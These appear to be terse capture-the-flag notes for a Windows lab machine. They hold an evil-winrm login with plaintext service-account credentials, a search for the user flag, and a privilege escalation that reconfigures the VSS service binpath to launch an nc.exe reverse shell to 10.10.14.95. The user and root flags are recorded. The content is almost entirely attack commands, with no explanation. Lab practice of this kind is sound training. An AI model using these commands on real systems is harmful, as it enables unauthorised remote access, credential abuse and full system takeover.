```
sudo docker run --rm -ti --name evil-winrm \
-v /home/jello/evil-winrm/ps1_scripts:/ps1_scripts \
-v /home/jello/evil-winrm/exe_files:/exe_files \
-v /home/jello/evil-winrm/data:/data \
oscarakaelvis/evil-winrm -s '/ps1_scripts/' -e '/exe_files/' \
-S -u 'svc-printer' -p '1edFg43012!!' -i 10.129.95.241

Get-Childitem -Path C:\Users -Recurse "user.txt"

user >> f239a0724c472793f9d8db20c1530be1

sc.exe config VSS binpath="C:\windows\system32\cmd.exe /c C:\Users\svc-printer\Desktop\nc.exe -e cmd 10.10.14.95 2000"

root >> ec00c03074c8d64dda44f9fe93fb8285
```